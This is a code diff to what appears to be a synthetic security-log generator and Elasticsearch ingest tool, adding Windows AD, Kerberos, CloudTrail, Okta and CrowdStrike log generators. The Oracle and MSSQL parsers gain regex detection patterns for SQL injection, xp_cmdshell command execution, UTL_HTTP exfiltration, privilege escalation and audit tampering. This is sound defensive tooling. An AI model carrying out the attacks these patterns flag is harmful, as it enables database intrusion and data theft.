+  else if(eid===4769){evtData={TargetUserName:user,TargetDomainName:domain,ServiceName:pick([`MSSQLSvc/sql-prod-01.${adDomain()}:1433`,`HTTP/webapp.${adDomain()}:80`,`HOST/dc01.${adDomain()}`,`CIFS/fileserver.${adDomain()}`]),TicketEncryptionType:'0x17',TicketOptions:'0x40810000',Status:'0x0',IpAddress:randomIP()};action='kerberos-service-ticket-requested';outcome='success';}
+  else if(eid===4771){evtData={TargetUserName:user,PreAuthType:'2',Status:pick(['0x12','0x18','0x6']),IpAddress:randomIP()};action='kerberos-preauth-failed';outcome='failure';}
+  else{evtData={TargetUserName:user,TargetDomainName:domain,Status:pick(['0x0','0xC000006A','0xC0000064']),WorkstationName:randomHostname(),LogonType:'3'};action='ntlm-auth';outcome=evtData.Status==='0x0'?'success':'failure';}
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:'Security',computer_name:dc,provider_name:'Microsoft-Windows-Security-Auditing',record_id:rand(10000,9999999),event_data:evtData},event:{code:String(eid),action,category:['authentication'],outcome,kind:'event'},host:{name:dc.split('.')[0],hostname:dc},user:{name:user,domain}});
+}
+function genWDNSLDAP(ts){
+  const host=randomHostname(),domain=adDomain(),user=randomUser();
+  const dc=`${pick(AD_DC_HOSTS)}.${domain}`;
+  const ldapPort=pick([389,636,3268,3269]);
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:3,channel:'Microsoft-Windows-Sysmon/Operational',computer_name:`${host}.${domain}`,provider_name:'Microsoft-Windows-Sysmon',record_id:rand(10000,9999999),event_data:{RuleName:'-',UtcTime:ts.toISOString().replace('T',' ').replace('Z',''),ProcessGuid:`{${randomHex(8)}-${randomHex(4)}-${randomHex(4)}-${randomHex(4)}-${randomHex(12)}}`,ProcessId:rand(100,65535),Image:pick(['C:\\Windows\\System32\\lsass.exe','C:\\Program Files\\Python\\python.exe','C:\\Windows\\System32\\powershell.exe']),SourceIp:randomPrivateIP(),SourcePort:randomHighPort(),DestinationIp:randomPrivateIP(),DestinationPort:String(ldapPort),Protocol:'tcp',Initiated:'true',SourceHostname:`${host}.${domain}`,DestinationHostname:dc}},event:{code:'3',action:'network-connection',category:['network'],outcome:'success',kind:'event'},source:{ip:randomPrivateIP(),port:randomHighPort()},destination:{ip:randomPrivateIP(),port:ldapPort,domain:dc},network:{transport:'tcp',protocol:ldapPort===636||ldapPort===3269?'ldaps':'ldap'},host:{name:host,hostname:host},user:{name:user,domain:domain.split('.')[0].toUpperCase()}});
+}
+function genWDNSADChanges(ts){
+  const dc=`${pick(AD_DC_HOSTS)}.${adDomain()}`,actor=randomUser(),domain=adDomain().split('.')[0].toUpperCase();
+  const r=Math.random();
+  let eid,evtData,action;
+  const dn=`CN=${randomUser()},OU=Users,DC=${adDomain().split('.')[0]},DC=${adDomain().split('.')[1]}`;
+  if(r<0.30){eid=5136;evtData={ObjectDN:dn,AttributeLDAPDisplayName:pick(['member','servicePrincipalName','adminCount','userAccountControl','msDS-AllowedToDelegateTo']),AttributeValue:pick(['512','66048','admin','SPN/host']),SubjectUserName:actor,SubjectDomainName:domain};action='directory-service-object-modified';}
+  else if(r<0.55){eid=5137;evtData={ObjectDN:dn,ObjectClass:pick(['user','group','computer']),SubjectUserName:actor,SubjectDomainName:domain};action='directory-service-object-created';}
+  else if(r<0.70){eid=5141;evtData={ObjectDN:dn,ObjectClass:'user',SubjectUserName:actor,SubjectDomainName:domain};action='directory-service-object-deleted';}
+  else{eid=4662;const isDCSync=Math.random()<0.18;evtData={SubjectUserName:actor,SubjectDomainName:domain,ObjectServer:'DS',ObjectType:'%{19195a5b-6da0-11d0-afd3-00c04fd930c9}',ObjectName:`CN=Configuration,DC=${adDomain().split('.')[0]},DC=${adDomain().split('.')[1]}`,Properties:isDCSync?'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2':'Undefined'};action=isDCSync?'dcsync-detected':'directory-service-access';}
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:'Security',computer_name:dc,provider_name:'Microsoft-Windows-Security-Auditing',record_id:rand(10000,9999999),event_data:evtData},event:{code:String(eid),action,category:['iam','configuration'],outcome:'success',kind:'event'},host:{name:dc.split('.')[0],hostname:dc},user:{name:actor,domain}});
+}
+function generateWDNSLogs(count,tr,types=WDNS_TYPES_DEFAULT){
+  const gens=[];
+  if(types.includes('dns'))gens.push(genWDNSQuery,genWDNSQuery,genWDNSQuery);
+  if(types.includes('kerberos'))gens.push(genWDNSKerberos,genWDNSKerberos);
+  if(types.includes('ldap'))gens.push(genWDNSLDAP);
+  if(types.includes('changes'))gens.push(genWDNSADChanges);
+  if(gens.length===0)gens.push(genWDNSQuery);
+  return generateTimestamps(count,tr).map(ts=>pick(gens)(ts));
 }
 
 // ─── APT29 / NOBELIUM Verified IOCs ──────────────────────────────────────────
@@ -782,9 +1277,9 @@ function generateRansomwareScenario(){
 function generateScenarioNoise(level,tr=120){
   if(!level||level==='off')return{};
   const conf={
-    low:   {windows:80, endpoint:50, fortinet:120},
-    medium:{windows:200,endpoint:120,fortinet:300,email:40, linux:60},
-    high:  {windows:500,endpoint:300,fortinet:600,email:100,linux:150,paloalto:200},
+    low:   {windows:160, endpoint:100, fortinet:240},
+    medium:{windows:400, endpoint:240, fortinet:600, email:80,  linux:120},
+    high:  {windows:1000,endpoint:600, fortinet:1200,email:200, linux:300, paloalto:400},
   }[level]||{};
   const noise={};
   setPool(level==='high'?20:level==='medium'?10:5);
@@ -1248,7 +1743,22 @@ const VENDOR_INGEST={
       const actionM=l.match(/ACTION\s*:\[\d+\]\s+"([^"]+)"/),userM=l.match(/DATABASE USER:\[\d+\]\s+"([^"]+)"/);
       const statusM=l.match(/STATUS:\[\d+\]\s+"([^"]+)"/),ipM=l.match(/HOST=(\d+\.\d+\.\d+\.\d+)/);
       const dbidM=l.match(/DBID:\[\d+\]\s+"([^"]+)"/),sqlM=l.match(/SQLTEXT:\[\d+\]\s+"([^"]+)"/);
-      return{'@timestamp':ts,message:l,event:{dataset:'oracle.audit',module:'oracle',kind:'event',category:['database'],action:(actionM?.[1]||'query').toLowerCase(),outcome:statusM?.[1]==='0'?'success':'failure',original:l},...(userM?{user:{name:userM[1]}}:{}),...(ipM?{source:{ip:ipM[1],address:ipM[1]}}:{}),...(dbidM?{database:{instance:{name:dbidM[1]}}}:{}),...(sqlM?{'oracle.audit.sql_text':sqlM[1]}:{}),agent:agentField('filebeat'),data_stream:dsField('oracle.audit')};
+      const sql=sqlM?.[1]||'';
+      const isInjection=sql.match(/UNION\s+SELECT|OR\s+'?1'?='?1|--\s*$/i);
+      const isRecon=sql.match(/DBA_USERS|V\$SESSION|DBA_ROLE_PRIVS|DBA_SYS_PRIVS|DBA_OBJECTS/i);
+      const isPrivEsc=sql.match(/GRANT\s+DBA|GRANT\s+EXECUTE\s+ON\s+UTL|DBMS_SCHEDULER\.CREATE_JOB/i);
+      const isExfil=sql.match(/UTL_HTTP\.REQUEST|UTL_FILE\.|UTL_ENCODE/i);
+      const isLateral=sql.match(/CREATE\s+DATABASE\s+LINK/i);
+      const isTamper=sql.match(/AUD\$|NOAUDIT|AUDIT_TRAIL=NONE|CLEAR_AUDIT_TRAIL/i);
+      const cats=['database'];
+      let tactic,technique;
+      if(isInjection){cats.push('intrusion_detection');tactic='Initial Access';technique='Exploit Public-Facing Application';}
+      else if(isExfil){cats.push('exfiltration');tactic='Exfiltration';technique='Exfiltration Over Web Service';}
+      else if(isPrivEsc){cats.push('privilege_escalation');tactic='Privilege Escalation';technique='Abuse Elevation Control Mechanism';}
+      else if(isRecon){cats.push('discovery');tactic='Discovery';technique='Permission Groups Discovery';}
+      else if(isLateral){cats.push('lateral_movement');tactic='Lateral Movement';technique='Remote Services';}
+      else if(isTamper){cats.push('defense_evasion');tactic='Defense Evasion';technique='Indicator Removal';}
+      return{'@timestamp':ts,message:l,event:{dataset:'oracle.audit',module:'oracle',kind:'event',category:cats,action:(actionM?.[1]||'query').toLowerCase(),outcome:statusM?.[1]==='0'?'success':'failure',severity:isInjection||isExfil||isPrivEsc?73:isRecon||isLateral||isTamper?47:21,original:l},...(userM?{user:{name:userM[1]}}:{}),...(ipM?{source:{ip:ipM[1],address:ipM[1]}}:{}),...(dbidM?{database:{instance:{name:dbidM[1]}}}:{}),...(sql?{'oracle.audit.sql_text':sql}:{}),...(tactic?{threat:{framework:'MITRE ATT&CK',tactic:{name:tactic},technique:{name:technique}}}:{}),agent:agentField('filebeat'),data_stream:dsField('oracle.audit')};
     },
   },
   mssql:{
@@ -1280,7 +1790,30 @@ const VENDOR_INGEST={
             return{...o,event:{...o.event,dataset:ds,module:mod},agent:agentField('metricbeat'),data_stream:{type:'metrics',dataset:ds,namespace:'default'}};
           }
           if(o.action_id!==undefined){
-            return{'@timestamp':o.event_time||new Date().toISOString(),message:l,event:{dataset:'microsoft_sqlserver.audit',module:mod,kind:'event',category:['database'],action:(o.action_name||o.action_id).toLowerCase(),outcome:o.succeeded?'success':'failure',original:l},...(o.server_principal_name?{user:{name:o.server_principal_name}}:{}),...(o.client_ip?{source:{ip:o.client_ip,address:o.client_ip}}:{}),...(o.database_name?{database:{instance:{name:o.database_name}}}:{}),'microsoft_sqlserver.audit.statement':o.statement||'',agent:agentField('filebeat'),data_stream:dsField('microsoft_sqlserver.audit')};
+            const stmt=o.statement||'';
+            const isXpCmd=stmt.match(/xp_cmdshell/i);
+            const isOleCom=stmt.match(/sp_OACreate|sp_OAMethod/i);
+            const isOpenRowset=stmt.match(/OPENROWSET|OPENDATASOURCE/i);
+            const isPrivEsc=stmt.match(/sp_addsrvrolemember|ALTER SERVER ROLE\s+sysadmin|EXECUTE AS LOGIN/i);
+            const isSpConfig=stmt.match(/sp_configure.*xp_cmdshell|sp_configure.*Ole Automation/i);
+            const isInjection=stmt.match(/UNION\s+SELECT|WAITFOR\s+DELAY|OR\s+'?1'?='?1/i);
+            const isLinkedSrv=stmt.match(/sp_addlinkedserver|sp_addlinkedsrvlogin/i);
+            const isRecon=stmt.match(/sys\.sql_logins|sys\.server_principals|sys\.xp_dirtree|sys\.xp_subdirs/i);
+            const isAuditTamper=stmt.match(/DISABLE.*AUDIT|DROP.*AUDIT|sp_configure.*criteria/i);
+            const cats=['database'];
+            let tactic,technique,cmdLine;
+            if(isXpCmd){cats.push('intrusion_detection','execution');tactic='Execution';technique='Command and Scripting Interpreter';
+              const m=stmt.match(/xp_cmdshell\s+'([^']+)'/i);if(m)cmdLine=m[1];}
+            else if(isOleCom){cats.push('execution');tactic='Execution';technique='System Services';}
+            else if(isOpenRowset){cats.push('collection');tactic='Collection';technique='Data from Local System';}
+            else if(isPrivEsc){cats.push('privilege_escalation');tactic='Privilege Escalation';technique='Valid Accounts';}
+            else if(isSpConfig){cats.push('defense_evasion');tactic='Defense Evasion';technique='Impair Defenses';}
+            else if(isInjection){cats.push('intrusion_detection');tactic='Initial Access';technique='Exploit Public-Facing Application';}
+            else if(isLinkedSrv){cats.push('lateral_movement');tactic='Lateral Movement';technique='Remote Services';}
+            else if(isRecon){cats.push('discovery');tactic='Discovery';technique='Account Discovery';}
+            else if(isAuditTamper){cats.push('defense_evasion');tactic='Defense Evasion';technique='Indicator Removal';}
+            const sev=isXpCmd||isOleCom||isOpenRowset||isPrivEsc?73:isSpConfig||isInjection||isLinkedSrv?47:21;
+            return{'@timestamp':o.event_time||new Date().toISOString(),message:l,event:{dataset:'microsoft_sqlserver.audit',module:mod,kind:'event',category:cats,action:(o.action_name||o.action_id).toLowerCase(),outcome:o.succeeded?'success':'failure',severity:sev,original:l},...(o.server_principal_name?{user:{name:o.server_principal_name}}:{}),...(o.client_ip?{source:{ip:o.client_ip,address:o.client_ip}}:{}),...(o.database_name?{database:{instance:{name:o.database_name}}}:{}),...(cmdLine?{process:{command_line:cmdLine}}:{}),'microsoft_sqlserver.audit.statement':stmt,...(tactic?{threat:{framework:'MITRE ATT&CK',tactic:{name:tactic},technique:{name:technique}}}:{}),agent:agentField('filebeat'),data_stream:dsField('microsoft_sqlserver.audit')};
           }
         }catch{}
       }
@@ -1300,6 +1833,131 @@ const VENDOR_INGEST={
       return{'@timestamp':ts,message:l,event:{dataset:'microsoft_sqlserver.log',module:mod,kind:'event',category:['database'],action:loginM?'login-failed':errM?'database-error':'database-event',outcome:loginM||errM?'failure':'success',original:l},...(loginM?{user:{name:loginM[1]},source:{ip:loginM[2],address:loginM[2]}}:{}),...(errM?{error:{code:errM[1]}}:{}),agent:agentField('filebeat'),data_stream:dsField('microsoft_sqlserver.log')};
     },
   },
+  cloudtrail:{
+    getIndex(){return'logs-aws.cloudtrail-default';},
+    toDoc(l){
+      try{
+        const o=JSON.parse(l);
+        const user=o.userIdentity?.userName||(o.userIdentity?.arn||'').split('/').pop()||'';
+        const isErr=!!o.errorCode;
+        const svc=o.eventSource||'';
+        const cat=svc.includes('iam')||svc.includes('sts')?['iam','configuration']:svc.includes('signin')?['authentication']:['configuration'];
+        return{'@timestamp':o.eventTime||new Date().toISOString(),message:l,
+          event:{dataset:'aws.cloudtrail',module:'aws',kind:'event',action:o.eventName,outcome:isErr?'failure':'success',category:cat,provider:o.eventSource,original:l},
+          aws:{cloudtrail:{event_version:o.eventVersion,user_identity:{type:o.userIdentity?.type,arn:o.userIdentity?.arn,account_id:o.userIdentity?.accountId,user_name:user},event_source:o.eventSource,event_name:o.eventName,aws_region:o.awsRegion,error_code:o.errorCode,error_message:o.errorMessage,request_parameters:o.requestParameters?JSON.stringify(o.requestParameters):undefined,request_id:o.requestID,event_id:o.eventID,event_type:o.eventType,recipient_account_id:o.recipientAccountId}},
+          cloud:{account:{id:o.recipientAccountId||o.userIdentity?.accountId},region:o.awsRegion,provider:'aws'},
+          user:{name:user},source:{ip:o.sourceIPAddress,address:o.sourceIPAddress},
+          user_agent:{original:o.userAgent},
+          agent:agentField('filebeat'),data_stream:dsField('aws.cloudtrail')};
+      }catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'aws.cloudtrail',module:'aws'},agent:agentField('filebeat'),data_stream:dsField('aws.cloudtrail')};}
+    },
+  },
+  okta:{
+    getIndex(){return'logs-okta.system-default';},
+    toDoc(l){
+      try{
+        const o=JSON.parse(l);
+        const userId=o.actor?.alternateId||'';
+        const isFailure=o.outcome?.result==='FAILURE'||o.outcome?.result==='DENIED';
+        const et=o.eventType||'';
+        const cat=et.includes('session')||et.includes('authentication')?['authentication']:et.includes('user')||et.includes('group')?['iam']:['configuration'];
+        return{'@timestamp':o.published||new Date().toISOString(),message:l,
+          event:{dataset:'okta.system',module:'okta',kind:'event',action:o.eventType,outcome:isFailure?'failure':'success',category:cat,provider:'Okta',original:l},
+          okta:{actor:o.actor,client:o.client,event_type:o.eventType,outcome:o.outcome,target:o.target,transaction:o.transaction,uuid:o.uuid,display_message:o.displayMessage,severity:o.severity,security_context:o.securityContext,authentication_context:o.authenticationContext,request:o.request},
+          user:{name:userId,email:userId},
+          source:{ip:o.client?.ipAddress,address:o.client?.ipAddress},
+          agent:agentField('filebeat'),data_stream:dsField('okta.system')};
+      }catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'okta.system',module:'okta'},agent:agentField('filebeat'),data_stream:dsField('okta.system')};}
+    },
+  },
+  crowdstrike:{
+    getIndex(l){try{const o=JSON.parse(l);const et=o.metadata?.eventType;if(et==='DetectionSummaryEvent')return'logs-crowdstrike.falcon-default';if(et==='AlertSummaryEvent')return'logs-crowdstrike.alert-default';if(et==='SpotlightVulnerabilityEvent')return'logs-crowdstrike.vulnerability-default';try{const p=JSON.parse(l);if(p._eventType==='HostInventory')return'logs-crowdstrike.host-default';}catch{}return'logs-crowdstrike.fdr-default';}catch{return'logs-crowdstrike.fdr-default';}},
+    toDoc(l){
+      try{
+        const o=JSON.parse(l);
+        if(o._eventType==='HostInventory'){
+          const hi=CS_HOST_INFO[o.hostname]||{};
+          const ds='crowdstrike.host';
+          return{'@timestamp':o.last_seen||new Date().toISOString(),message:l,
+            event:{dataset:ds,module:'crowdstrike',kind:'asset',action:'host-inventory',category:['host'],type:['info'],outcome:'success',original:l},
+            host:{name:o.hostname,hostname:o.hostname,id:o.device_id,ip:[o.local_ip,o.external_ip].filter(Boolean),mac:[o.mac_address],domain:o.machine_domain,os:hi.os||{name:o.os_version,family:'windows',platform:'windows',version:o.os_version_normalized}},
+            agent:{type:'elastic_agent',id:o.device_id,name:o.hostname,version:o.agent_version,ephemeral_id:o.device_id?.slice(0,8)||'00000000'},
+            crowdstrike:{host:{device_id:o.device_id,hostname:o.hostname,local_ip:o.local_ip,external_ip:o.external_ip,mac_address:o.mac_address,os_version:o.os_version,platform_name:o.platform_name,agent_version:o.agent_version,first_seen:o.first_seen,last_seen:o.last_seen,status:o.status,containment_status:o.containment_status,product_type_desc:o.product_type_desc,system_manufacturer:o.system_manufacturer,system_product_name:o.system_product_name,machine_domain:o.machine_domain,site_name:o.site_name,tags:o.tags,groups:o.groups,policies:o.policies}},
+            data_stream:dsField(ds),agent_info:{local_time:o.agent_local_time}};
+        }
+        const evt=o.event||{};
+        const meta=o.metadata||{};
+        const eventType=meta.eventType||'';
+        const isDetect=eventType==='DetectionSummaryEvent';
+        const isAlert=eventType==='AlertSummaryEvent';
+        const isVuln=eventType==='SpotlightVulnerabilityEvent';
+        const isDns=eventType==='DnsRequest';
+        const isNetwork=eventType==='NetworkConnectIP4';
+        const isProcess=eventType==='ProcessRollup2';
+        const ts=meta.eventCreationTime?new Date(meta.eventCreationTime).toISOString():new Date().toISOString();
+        const host=evt.ComputerName||evt.HostName||evt.host_info?.hostname||'';
+        const hi=CS_HOST_INFO[host]||{};
+        const aid=meta.aid||evt.aid||hi.aid||'';
+        const hostIP=evt.LocalIP||evt.LocalAddressIP4||evt.host_info?.local_ip||hi.ip||'';
+        const hostMAC=evt.MACAddress||'';
+        const hostDomain=evt.MachineDomain||'';
+        const rawOS=evt.OperatingSystem||evt.host_info?.os_version||hi.os?.name||'';
+        const osInfo=hi.os||{name:rawOS,family:'windows',version:evt.host_info?.os_version_normalized||'',platform:'windows'};
+        const userRaw=evt.UserName||evt.UserId||'';
+        const user=userRaw.includes('\\')?userRaw.split('\\').pop():userRaw;
+        const userDomain=userRaw.includes('\\')?userRaw.split('\\')[0]:'';
+        const ds=isDetect?'crowdstrike.falcon':isAlert?'crowdstrike.alert':isVuln?'crowdstrike.vulnerability':'crowdstrike.fdr';
+        const cat=isDetect?['malware','intrusion_detection']:isAlert?['intrusion_detection']:isVuln?['vulnerability']:isDns||isNetwork?['network']:['process'];
+        const action=isDetect?'detection':isAlert?'alert':isVuln?'vulnerability-found':isProcess?'process-start':isNetwork?'network-connection':isDns?'dns-query':eventType.toLowerCase();
+        const doc={
+          '@timestamp':ts,message:l,
+          event:{dataset:ds,module:'crowdstrike',kind:isDetect||isAlert?'alert':'event',action,outcome:'success',category:cat,type:isProcess?['start']:isNetwork||isDns?['connection']:['info'],original:l},
+          crowdstrike:{
+            event:evt,
+            metadata:{...meta,aid,event_type:eventType,customer_id:meta.customerIDString,event_creation_time:ts},
+          },
+          host:{name:host,hostname:host,...(aid?{id:aid}:{}),...(hostIP?{ip:[hostIP]}:{}),...(hostDomain?{domain:hostDomain}:{}),...(hostMAC?{mac:[hostMAC]}:{}),...(osInfo.name?{os:osInfo}:{})},
+          user:{name:user,...(userDomain?{domain:userDomain}:{})},
+          agent:{type:'elastic_agent',id:aid||hi.aid||'',name:host,version:hi.sensorVersion||'7.14.16703.0',ephemeral_id:aid?aid.slice(0,8):'00000000'},
+          data_stream:dsField(ds),
+        };
+        if(isDetect){
+          doc.event.severity=evt.Severity||3;
+          doc.rule={name:evt.DetectDescription||evt.DetectName};
+          doc.threat={framework:'MITRE ATT&CK',tactic:{name:evt.Tactic},technique:{name:evt.Technique,id:evt.TechniqueId}};
+          if(evt.FileName){doc.process={name:evt.FileName,executable:evt.FilePath?evt.FilePath+'\\'+evt.FileName:evt.FileName,pid:evt.ProcessId,...((evt.SHA256HashData||evt.MD5HashData)?{hash:{...(evt.SHA256HashData?{sha256:evt.SHA256HashData}:{}),...(evt.MD5HashData?{md5:evt.MD5HashData}:{})}}:{})};}
+        }
+        if(isAlert){
+          doc.event.severity=evt.Severity||3;
+          doc.rule={name:evt.Name,description:evt.Description};
+          doc.threat={framework:'MITRE ATT&CK',tactic:{name:evt.Tactic},technique:{name:evt.Technique}};
+          if(evt.FileName){doc.process={name:evt.FileName,command_line:evt.CommandLine,...((evt.SHA256HashData)?{hash:{sha256:evt.SHA256HashData}}:{})};}
+          doc.crowdstrike={...doc.crowdstrike,alert:{id:evt.AlertId,type:evt.AlertType,status:evt.Status,assigned_to_name:evt.AssignedToName,severity:evt.SeverityName,tactic:evt.Tactic,technique:evt.Technique}};
+        }
+        if(isVuln){
+          const cve=evt.cve||{};
+          doc.vulnerability={id:cve.id,severity:cve.severity,score:{base:cve.base_score},description:cve.description,published:cve.published_date,enumeration:'CVE',reference:`https://nvd.nist.gov/vuln/detail/${cve.id}`,category:'OS',scanner:{vendor:'CrowdStrike'}};
+          doc.crowdstrike={...doc.crowdstrike,vulnerability:{id:evt.id,status:evt.status,aid:evt.aid,cve,host_info:evt.host_info,app:evt.app,remediation_description:evt.remediation_description}};
+        }
+        if(isProcess&&evt.FileName){doc.process={name:evt.FileName,executable:evt.ImageFileName||evt.FileName,command_line:evt.CommandLine,pid:evt.TargetProcessId||evt.ProcessId,...((evt.SHA256HashData||evt.MD5HashData)?{hash:{...(evt.SHA256HashData?{sha256:evt.SHA256HashData}:{}),...(evt.MD5HashData?{md5:evt.MD5HashData}:{})}}:{})};}
+        if(isNetwork&&(evt.LocalAddressIP4||evt.RemoteAddressIP4)){doc.source={ip:evt.LocalAddressIP4,port:evt.LocalPort};doc.destination={ip:evt.RemoteAddressIP4,port:evt.RemotePort};doc.network={transport:Number(evt.Protocol)===6?'tcp':Number(evt.Protocol)===17?'udp':'unknown',direction:'outbound',type:'ipv4'};}
+        if(isDns&&evt.DomainName){doc.dns={question:{name:evt.DomainName,type:evt.RequestType||'A'},type:'query'};}
+        return doc;
+      }catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'crowdstrike.fdr',module:'crowdstrike'},agent:agentField('elastic_agent'),data_stream:dsField('crowdstrike.fdr')};}
+    },
+  },
+  wdns:{
+    getIndex(l){try{const o=JSON.parse(l);const eid=o.winlog?.event_id;return(eid===22||eid===3)?'logs-windows.sysmon_operational-default':'logs-windows.security-default';}catch{return'logs-windows.sysmon_operational-default';}},
+    toDoc(l){
+      try{
+        const o=JSON.parse(l);
+        const eid=o.winlog?.event_id;
+        const isSysmon=eid===22||eid===3;
+        const ds=isSysmon?'windows.sysmon_operational':'windows.security';
+        return{...o,message:l,event:{...o.event,dataset:ds,module:'windows',original:l},agent:agentField(isSysmon?'elastic_agent':'winlogbeat'),data_stream:dsField(ds)};
+      }catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'windows.sysmon_operational',module:'windows'},agent:agentField('elastic_agent'),data_stream:dsField('windows.sysmon_operational')};}
+    },
+  },
 };
 
 async function pushLogsToElastic(logs,indexOverrides={}){
@@ -1309,8 +1967,21 @@ async function pushLogsToElastic(logs,indexOverrides={}){
   if(bulkLines.length===0)throw new Error('No logs to push');
   const res=await fetch(`${cfg.url.replace(/\/$/,'')}/_bulk`,{method:'POST',headers:buildHeaders(cfg),body:bulkLines.join('\n')+'\n'});
   if(!res.ok)throw new Error(`HTTP ${res.status}: ${res.statusText}`);
-  const data=await res.json();const total=bulkLines.length/2;const errs=data.items?.filter(i=>i.create?.error||i.index?.error).length||0;
-  return{total,errors:errs,indices:idxCounts};
+  const data=await res.json();const total=bulkLines.length/2;
+  const errItems=(data.items||[]).filter(i=>i.create?.error||i.index?.error);
+  const errs=errItems.length;
+  // Group errors by index so we can see which indices are failing
+  const errByIndex={};
+  errItems.forEach((item,i)=>{
+    const op=item.create||item.index;
+    const idx=op._index||'unknown';
+    const e=op.error;
+    if(!errByIndex[idx])errByIndex[idx]=[];
+    if(errByIndex[idx].length<2)errByIndex[idx].push(`[${e?.type}] ${e?.reason}`);
+  });
+  const sampleErrors=Object.entries(errByIndex).map(([idx,msgs])=>`${idx}:\n  ${msgs.join('\n  ')}`);
+  console.log('[push] indices:',idxCounts,'errors by index:',errByIndex);
+  return{total,errors:errs,indices:idxCounts,sampleErrors};
 }
 
 // ─── VENDORS config ───────────────────────────────────────────────────────────
@@ -1324,6 +1995,10 @@ const VENDORS=[
   {id:'linux',name:'Linux / Syslog',description:'SSH auth, sudo, auditd syscalls, cron, and systemd',tags:['SSH','Auditd','Sudo','Syslog'],indices:['logs-system.auth-default','logs-auditd.log-default'],generator:generateLinuxLogs},
   {id:'oracle',name:'Oracle Database',description:'Unified audit trail, alert.log, listener logs, and performance metrics',tags:['Database','Audit','Oracle','Metrics'],indices:['logs-oracle.audit-default','logs-oracle.database_audit-default','logs-oracle.listener-default','metrics-oracle.performance-default'],generator:generateOracleLogs},
   {id:'mssql',name:'Microsoft SQL Server',description:'Audit, transaction log, ERRORLOG, SQL Agent events, and performance metrics',tags:['Database','MSSQL','Audit','Metrics'],indices:['metrics-microsoft_sqlserver.transaction_log-default','metrics-microsoft_sqlserver.performance-default','logs-microsoft_sqlserver.audit-default','logs-microsoft_sqlserver.log-default','logs-microsoft_sqlserver.agent-default'],generator:generateMSSQLLogs},
+  {id:'cloudtrail',name:'AWS CloudTrail',description:'Management, IAM, S3 data, and security-relevant API events across AWS services',tags:['AWS','CloudTrail','IAM','S3'],indices:['logs-aws.cloudtrail-default'],generator:generateCloudTrailLogs},
+  {id:'okta',name:'Okta',description:'Authentication, user lifecycle, policy changes, and application provisioning events',tags:['Identity','SSO','MFA','IAM'],indices:['logs-okta.system-default'],generator:generateOktaLogs},
+  {id:'crowdstrike',name:'CrowdStrike Falcon',description:'Process telemetry, network connections, DNS, Falcon detection summaries, alerts, and vulnerability spotlight',tags:['EDR','Detections','Vulnerability','MITRE'],indices:['logs-crowdstrike.falcon-default','logs-crowdstrike.fdr-default','logs-crowdstrike.alert-default','logs-crowdstrike.vulnerability-default','logs-crowdstrike.host-default'],generator:generateCrowdStrikeLogs},
+  {id:'wdns',name:'Windows DNS & AD',description:'Sysmon DNS queries, LDAP connections, Kerberos events (4768/4769/4771), and AD directory changes',tags:['DNS','Active Directory','Kerberos','LDAP'],indices:['logs-windows.sysmon_operational-default','logs-windows.security-default'],generator:generateWDNSLogs},
 ];
 const SCENARIOS=[
   {id:'apt29',name:'APT29 — Midnight Blizzard',description:'State-sponsored: OAuth phishing → persistence → credential dump → lateral movement → C2 → exfiltration. Generates Kibana security alerts for Attack Discovery.',severity:'critical',type:'apt',tactics:['Initial Access','Execution','Persistence','Defense Evasion','Credential Access','Discovery','Lateral Movement','Collection','Command and Control','Exfiltration'],generator:generateAPT29Scenario},
@@ -1388,22 +2063,44 @@ function ConfigDialog({open,onClose,onSave}){
   );
 }
 
+// ─── Vendor Logo (Simple Icons CDN) ──────────────────────────────────────────
+// Uses https://cdn.simpleicons.org/{slug}/ffffff for white logo on brand bg.
+// onError hides the <img> gracefully if a slug ever changes upstream.
+const VENDOR_LOGO_CONF={
+  fortinet:    {bg:'#DA1E2E', slug:'fortinet',        text:'FG'},
+  paloalto:    {bg:'#003A70', slug:'paloaltonetworks', text:'PAN'},
+  switch:      {bg:'#1B9BCC', slug:'cisco',            text:'CS'},
+  email:       {bg:'#0078D4', slug:'microsoftoutlook', text:'EX'},
+  endpoint:    {bg:'#070707', slug:'elastic',          text:'EL'},
+  windows:     {bg:'#0078D4', slug:'windows',          text:'WIN'},
+  linux:       {bg:'#E95420', slug:'linux',             text:'LX'},
+  oracle:      {bg:'#C74634', slug:'oracle',            text:'ORA'},
+  mssql:       {bg:'#CC2929', slug:'microsoftsqlserver',text:'SQL'},
+  cloudtrail:  {bg:'#232F3E', slug:'amazonaws',         text:'AWS'},
+  okta:        {bg:'#007DC1', slug:'okta',              text:'OK'},
+  crowdstrike: {bg:'#E1003C', slug:'crowdstrike',       text:'CS'},
+  wdns:        {bg:'#00188F', slug:'microsoftentra',    text:'AD'},
+};
+function VendorLogo({id}){
+  const c=VENDOR_LOGO_CONF[id]||{bg:'#374151',slug:null,text:'?'};
+  const[failed,setFailed]=useState(false);
+  return(
+    <div style={{background:c.bg,width:'100%',height:'100%',display:'flex',alignItems:'center',justifyContent:'center',padding:'7px',boxSizing:'border-box'}}>
+      {c.slug&&!failed
+        ?<img src={`https://cdn.simpleicons.org/${c.slug}/ffffff`} alt={id} style={{width:'100%',height:'100%',objectFit:'contain'}} onError={()=>setFailed(true)}/>
+        :<span style={{color:'#fff',fontWeight:700,fontSize:'10px',letterSpacing:'0.5px',lineHeight:1}}>{c.text||'?'}</span>}
+    </div>
+  );
+}
+
 // Vendor Card
 const WIN_TYPE_LABELS={security:'Security',application:'Application',system:'System',applocker:'AppLocker',powershell:'PowerShell'};
-function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRandomness,minLogs,onMinLogs,emailDomain,onEmailDomain,windowsLogTypes,onWindowsLogTypes,linuxLogTypes,onLinuxLogTypes,oracleLogTypes,onOracleLogTypes,mssqlLogTypes,onMSSQLLogTypes,hostnamePrefix,onHostnamePrefix,hostnameCap,onHostnameCap,includeAdmin,onIncludeAdmin,indexOverride,onIndexOverride}){
